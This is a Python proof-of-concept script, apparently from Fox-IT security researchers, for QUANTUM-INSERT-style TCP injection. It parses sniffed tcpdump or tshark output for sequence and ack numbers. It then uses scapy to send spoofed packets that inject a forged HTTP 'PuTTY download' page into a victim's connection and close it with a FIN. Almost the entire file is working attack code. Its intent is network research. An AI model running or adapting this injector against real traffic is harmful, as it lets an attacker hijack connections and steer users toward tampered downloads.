
#!/usr/bin/env python
#
# file:     monitor.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# monitor.py, used to leak TCP sequence + ack numbers to the shooter
#
# Example usage for tcpdump (shoot on SYN+ACK reply from server):
#  $ stdbuf --output=0 tcpdump -nn -i eth0 "host jsonip.com and tcp[tcpflags]=(tcp-syn|tcp-ack)" | python monitor.py -s 127.0.0.1
#
# Example usage for tshark (shoot on GET request from client):
#  $ stdbuf --output=0 tshark -ni eth0 -Tfields -e tcp.seq -e tcp.ack -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.analysis.bytes_in_flight -e http.host -e 'http.cookie' -o tcp.relative_sequence_numbers:0 -R http.request 'host jsonip.com and port 80' | python monitor.py -s 127.0.0.1 --tshark
#

# Python imports
import re
import sys
from scapy.all import *

# Shared data


# This regex may vary by tcpdump versions and/or operating systems
REGEX_SYNACK = re.compile(
    "([\d\.]+)\.(\d+) > ([\d\.]+)\.(\d+): Flags.*seq (\d+), ack (\d+)")


PAYLOAD_PUTTY_BODY = '<!doctype html>\r\n<html lang="en">\r\n<head>\r\n  <meta charset="utf-8">\r\n  <title>NetSec PuTTY download</title>\r\n</head>\r\n\r\n<body>\r\n  <h1>NetSec PuTTY Client Download</h1>\r\n  <p>Download our secure PuTTY client here:</p>\r\n  <p id="putty_download"><a href="https://the.earth.li/~sgtatham/putty/0.74/w64/putty-64bit-0.74-installer.msi">putty-64bit-0.71-installer.msi</a> (SHA-256: 2a001dd1c5d81ae1c17db97b0bb6c2c7cada43888d4f30a814c18d55aa28feb6)</p>\r\n  <p>Do not forget to verify the hash after downloading the installer!</p>\r\n</body>\r\n</html>\r\n'
PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 18:16:19 GMT\r\nContent-Type: text/html\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nConnection: keep-alive\r\nETag: W/"60770091-208"\r\n\r\n'
PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY


def main():
    print('Ready to QUANTUM INJECT HAHAHA')
    conf.L3socket = L3RawSocket
    while True:
        line = sys.stdin.readline()
        print("LOG: ", line.strip())
        src, sport, dst, dport, seq, ack = REGEX_SYNACK.search(
            line).groups()
        payload = PAYLOAD_PUTTY
        p = IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport),
                                       seq=int(seq)+1, ack=int(ack), flags="PA") / payload
        send(p)
        print('Sending: %r' % p)
        p = IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport),
                                       seq=int(seq)+len(payload)+1, ack=int(ack), flags="FA")
        send(p)
        print('Sending: %r' % p)


if __name__ == '__main__':
    sys.exit(main())
